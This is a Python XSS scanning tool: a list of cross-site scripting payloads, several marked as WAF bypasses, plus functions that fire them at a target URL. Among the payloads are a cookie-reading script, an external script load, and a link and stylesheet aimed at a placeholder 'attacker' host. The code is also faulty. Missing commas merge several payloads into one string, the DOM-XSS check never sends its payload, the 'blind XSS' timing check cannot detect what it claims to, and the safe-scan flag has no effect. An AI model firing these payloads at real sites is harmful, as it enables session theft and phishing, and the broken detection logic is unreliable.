# payloads.py
# Collection of advanced XSS payloads

import argparse
import requests
import time

# XSS Payloads - including WAF Bypass
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click Here</a>",
    "<input autofocus onfocus=alert('XSS')>",
    "<img src='x' onerror='alert(1)'>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'></img>",
    "<svg/onload=alert(1)>",
    "<img src=javascript:alert(1)>",
    "<script src='https://example.com/xss.js'></script>",
    "<input type='text' value=''><script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=1 onerror=prompt(1)>",
    "<svg/onload=confirm(1)>",
    "<body onload=alert(1)>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<script>alert('Hacked!');</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<form action='javascript:alert(1)'></form>"
    "'-prompt(8)-'"   
    "<img src='x' onerror='alert(1)'>",
    "<img src=1 onerror=confirm(1)>",
    "<svg/onload=alert(1)>",
    "<a href=javascript:confirm('XSS')>Click me</a>", 
    "<img src=x onerror=alert('DOM-XSS')>",
    "<input autofocus onfocus=alert('DOM-XSS')>",
    
    "<img src='data:image/svg+xml;base64,PHN2ZyBvbm1vZGlmaWVkZXZhbGVyY2hpc3Q9Ilxpc3N1Zz4=' onerror=alert('XSS')>",
    "<script>%61lert('XSS')</script>",  # %61 is 'a' in hex
    "<script>eval('aler'+'t(1)')</script>",
    "<div>`-alert(1)</script><script>`</div>"
    "<div>`-alert(1)</script><script>`</div>"
    "<svg o<script>nload=alert(1)>"
    "<script>/&/-alert(1)</script>"
    "<script>/&amp;/-alert(1)</script>"
    "<script>location.href=decodeURIComponent(location.hash.slice(1));</script>"
    "<link rel=stylesheet href=//attacker/test.css>"
    "<a href=https://attacker/>Session expired. Please login again.</a>"
    "<script>fetch('/log', {method: 'POST', body: 'XSS'})</script>",  # Using a server endpoint for Blind XSS
]

# Function to test for reflected XSS
def test_reflected_xss(url, payload, params):
    try:
        response = requests.get(url, params=params)
        if payload in response.text:
            print(f"[+] Reflected XSS found with payload: {payload}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing reflected XSS: {e}")
    return False

# Function to test for DOM-based XSS
def test_dom_xss(url, payload):
    try:
        response = requests.get(url)
        if payload in response.text:
            print(f"[+] DOM-based XSS found with payload: {payload}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing DOM XSS: {e}")
    return False

# Function to handle blind XSS (checking response time)
def test_blind_xss(url, payload):
    try:
        start = time.time()
        response = requests.get(url + payload)
        end = time.time()
        if end - start > 2:  # Delay indicating possible blind XSS
            print(f"[+] Possible Blind XSS detected with payload: {payload}")
            return True
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing blind XSS: {e}")
    return False

# Main function to handle arguments and test for XSS vulnerabilities
def main():
    # Setup argparse for CLI
    parser = argparse.ArgumentParser(description="XSS Finder Tool")
    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-level', '--scan-level', choices=['basic', 'intermediate', 'deep'], default='basic', help="Scan depth level")
    parser.add_argument('-s', '--safe-scan', action='store_true', help="Perform a safe scan (minimal risk)")
    
    args = parser.parse_args()
    
    print(f"Starting XSS scan on: {args.url} with {args.scan_level} scan level\n")
    
    # Define scan depth based on user input
    if args.scan_level == "basic":
        scan_depth = XSS_PAYLOADS[:5]  # Basic scan, limited payloads
    elif args.scan_level == "intermediate":
        scan_depth = XSS_PAYLOADS  # Full payloads for intermediate scan
    else:
        scan_depth = XSS_PAYLOADS * 2  # Deeper scan, more payloads

    if args.safe_scan:
        print("[*] Safe scan enabled (minimal payloads)")

    # Inject XSS payloads into the URL
    for payload in scan_depth:
        params = {'input': payload}  # Assuming there's an 'input' parameter in the URL

        # Reflected XSS Check
        if test_reflected_xss(args.url, payload, params):
            continue

        # DOM-based XSS Check
        if test_dom_xss(args.url, payload):
            continue

        # Blind XSS Check (time-based)
        if test_blind_xss(args.url, payload):
            continue

    print("\n[*] XSS scan completed.")

if __name__ == "__main__":
    main()
